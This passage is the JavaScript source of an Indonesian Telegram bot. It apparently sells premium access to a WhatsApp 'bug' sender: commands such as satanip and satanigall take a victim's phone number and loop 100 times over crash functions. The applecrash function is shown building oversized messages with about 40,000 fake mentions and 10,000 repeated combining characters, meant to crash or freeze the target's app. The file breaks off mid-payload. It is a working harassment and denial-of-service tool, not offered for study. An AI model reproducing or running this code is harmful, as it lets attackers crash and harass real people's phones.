<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai (tanpa penundaan)
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
      await applecrash(sock, target);
      await applecrash(sock, target);
      await applecrash(sock, target);
      await GalaxyBlank(sock, jid);
      await GalaxyBlank(sock, jid);
      
    console.log(chalk.red.bold(`𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕Sending Bug ${i + 1}/100 To ${target}`));
  }

});



bot.command("satanip2", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevovoul 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "HTML",
    }
  );

  // Tanpa setTimeout, semua pembaruan caption ini akan terjadi secara instan
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai (tanpa penundaan)
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");

console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {

      await applecrash(sock, target);
      await applecrash(sock, target);
      await applecrash(sock, target);

    console.log(chalk.red.bold(`𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕Sending Bug ${i + 1}/100 To ${target}`));
  }
});

bot.command("satanip", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevovoul 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "HTML",
    }
  );

  // Tanpa setTimeout, semua pembaruan caption ini akan terjadi secara instan
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai (tanpa penundaan)
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");

console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {

      await applecrash(sock, target);
      await applecrash(sock, target);
      await freezeIphone(target);
      await freezeIphone(target);

    console.log(chalk.red.bold(`𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕Sending Bug ${i + 1}/100 To ${target}`));
  }
});

bot.command("satanigall", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevovoul 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "HTML",
    }
  );

  // Tanpa setTimeout, semua pembaruan caption ini akan terjadi secara instan
  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
    }
  );

  await ctx.editMessageCaption(
    `
<blockquote>▢ ｲᴀʀɢᴇᴛ : ${q}</blockquote>
<blockquote>▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ</blockquote>
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai (tanpa penundaan)
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");

console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {

      await GalaxyBlank(sock, jid);
      await GalaxyBlank(sock, jid);
      await GalaxyBlank(sock, jid);

    console.log(chalk.red.bold(`𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕Sending Bug ${i + 1}/100 To ${target}`));
  }
});
//Case bug twst

///////==== COMMAND OWNER ====\\\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});
///=== comand add admin ===\\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 526472198"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 57305916"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ heeee jadi premium 🗿 ${userId} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ heeee jadi premium 🗿i ${userId} sudah memiliki status premium.`
  );
});
bot.command("cekidgrup", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");

    if (args.length < 2) {
      return ctx.reply("Masukkan link grup WhatsApp!\nContoh: /cekidgrup https://chat.whatsapp.com/ABC123XYZ456");
    }

    const groupLink = args[1].trim();
    const match = groupLink.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);

    if (!match || !match[1]) {
      return ctx.reply("Link grup tidak valid.");
    }

    const inviteCode = match[1];
    const metadata = await anas.groupGetInviteInfo(inviteCode);

    if (!metadata || !metadata.id) {
      return ctx.reply("Gagal mengambil info grup. Link tidak aktif atau bot tidak punya akses.");
    }

    const groupId = metadata.id;
    const groupName = metadata.subject || "-";
    const groupDesc = metadata.desc?.toString() || "-";
    const memberCount = metadata.size || 0;
    const creator = metadata.creator ? metadata.creator.replace("@s.whatsapp.net", "") : "-";
    const creationDate = metadata.creation ? new Date(metadata.creation * 1000).toLocaleString("id-ID") : "-";

    const adminList = metadata.participants
      ?.filter(p => p.admin)
      .map(p => `• ${p.id.replace("@s.whatsapp.net", "")} (${p.admin})`)
      .join("\n") || "-";

    const message = `
📌 Informasi Grup WhatsApp

Nama Grup       : ${groupName}
ID Grup         : ${groupId}
Tanggal Dibuat  : ${creationDate}
Dibuat Oleh     : ${creator}
Jumlah Member   : ${memberCount}

Daftar Admin:
${adminList}

Deskripsi:
${groupDesc}

Link Undangan:
https://chat.whatsapp.com/${inviteCode}
    `.trim();

    return ctx.reply(message);
  } catch (err) {
    console.error("Error /cekidgrup:", err);
    return ctx.reply("Terjadi kesalahan saat mengambil info grup.");
  }
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem🗿.`);
});

//fungsi imglink
const imgLinks = [];

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addpairing", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❌ Masukin nomor nya ngentot, Contoh nih mek /addpairing <nomor_wa>"
    );
  }

  let phoneNumber = args[1].replace(/[^0-9]/g, "");

  if (anas && anas.user) {
    return await ctx.reply("Santai Masih Aman!! Gass ajaa cik...");
  }

  let sentMessage;

  try {
    // LANGKAH 1: Kirim pesan awal
    sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕
▢ Menyiapkan kode pairing...
╰➤ 刀のﾶの尺 : ${phoneNumber}
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });

    // LANGKAH 2: Ambil kode pairing
    const code = await anas.requestPairingCode(phoneNumber, "12345678"); // CUSTOM PAIR DISINI MINIM 8 HURUF
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕
▢ Kode Pairing Anda...
╰➤ 刀のﾶの尺 : ${phoneNumber}
╰➤ ズのり乇  : ${formattedCode}
`,
      { parse_mode: "HTML", }
    );

    // LANGKAH 3: Tunggu koneksi WhatsApp
    let isConnected = true;

anas.ev.on("connection.update", async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "open" && !isConnected) {
    isConnected = true;
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕
▢ Update pairing anda..
╰➤ 刀のﾶの尺 : ${phoneNumber}
╰➤ 丂ｲﾑｲひ丂 : Successfully
`,
      { parse_mode: "HTML", }
    );
  }

  if (connection === "close" && !isConnected) {
    const shouldReconnect =
      lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

    if (!shouldReconnect) {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        sentMessage.message_id,
        null,
        `
𝚂𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕𝚕
▢ Update pairing anda...
╰➤ 刀のﾶの尺 : ${phoneNumber}
╰➤ 丂ｲﾑｲひ丂 : Gagal tersambung
`,
        { parse_mode: "HTML", }
      );
    }
  }
});


  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});


// Handler tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", checkOwner, async (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("♻️Session berhasil dihapus, Segera lakukan restart pada panel anda sebelum pairing kembali");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});

//Command Restart
bot.command("restart", checkOwner, async (ctx) => {
  await ctx.reply("Restarting...");
  setTimeout(() => {
    process.exit(0);
  }, 1000); // restart setelah 1 detik
});







async function runBrutal(type, target) {
  console.log(`[${type}] Target: ${target}`);
  for (let i = 0; i < 302; i++) {
    

    await new Promise(resolve => setTimeout(resolve, 1000)); // delay 0.5 detik antar kirim
  }
}

// Alias fungsi
async function applecrash(sock, target) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const abcd = [
    { attrs: { biz_bot: "1" }, tag: "bot" },
    { attrs: {}, tag: "biz" },
  ];

  const api = JSON.stringify({
    status: true,
    criador: "KyyNotHuman",
    resultado: { type: "md", ws: { _eventsCount: 800000, mobile: true } },
  });

  const quotedMsg = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: "ABCDEF123456",
    },
    message: {
      conversation: "ᴀɴᴅᴀ sᴏᴘᴀɴ, ᴋᴀᴍɪ sᴇɢᴀɴ, ᴋʏʏ ɪs ʜᴇʀᴇ",
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
  };

  const embeddedMusic1 = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ᴀɴᴅᴀ sᴏᴘᴀɴ, ᴋᴀᴍɪ sᴇɢᴀɴ, ᴋʏʏ ɪs ʜᴇʀᴇ°" + "ោ៝".repeat(10000),
    title: "ᴀɴᴅᴀ sᴏᴘᴀɴ, ᴋᴀᴍɪ sᴇɢᴀɴ, ᴋʏʏ ɪs ʜᴇʀᴇ",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://t.me/pherine",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const embeddedMusic2 = {
    musicContentMediaId: "ziee",
    songId: "lemer",
    author: "ᴀɴᴅᴀ sᴏᴘᴀɴ, ᴋᴀᴍɪ sᴇɢᴀɴ, ᴋʏʏ ɪs ʜᴇʀᴇ",
    title: "ᴀɴᴅᴀ sᴏᴘᴀɴ, ᴋᴀᴍɪ sᴇɢᴀɴ, ᴋʏʏ ɪs ʜᴇʀᴇ",
    artworkDirectPath:
      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
  };

  const messages = [
    {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
          mimetype: "video/mp4",
          fileSha256: "l1hrH5Ol/Ko470AI8H1zlEuHxfnBbozFRZ7E80tD2L8=",
          fileLength: "27879524",
          seconds: 70,
          mediaKey: "2AcdMRLVnTLIIRZFArddskCLl3duuisx2YTHYvMoQPI=",
          caption: "—    𝙼𝙰𝚁𝙶𝙰 𖥻𝟽𝟹𝟷 𝙿𝙴𝚁𝚄𝚂𝙰𝙺 𝙻𝚄𝙱𝙰𝙽𝙶 قضيب" + abcd,
          height: 1280,
          width: 720,
          fileEncSha256: "GHX2S/UWYN5R44Tfrwg2Jc+cUSIyyhkqmNUjUwAlnSU=",
          directPath:
            "/v/t62.7161-24/19167818_1100319248790517_8356004008454746382_n.enc",
          mediaKeyTimestamp: "1746354010",
          contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList,
            quotedMessage: quotedMsg.message,
            stanzaId: quotedMsg.key.id,
            participant: quotedMsg.key.remoteJid,
          },
          annotations: [
            {
              embeddedContent: { embeddedMusic: embeddedMusic1 },
              embeddedAction: true,
            },
          ],
        },
      },
    },
    {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            mentionedJid: mentionedList,
            quotedMessage: quotedMsg.message,
            stanzaId: quotedMsg.key.id,
            participant: quotedMsg.key.remoteJid,
          },
        },
      },
    },
    {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
          mimetype: "video/mp4",
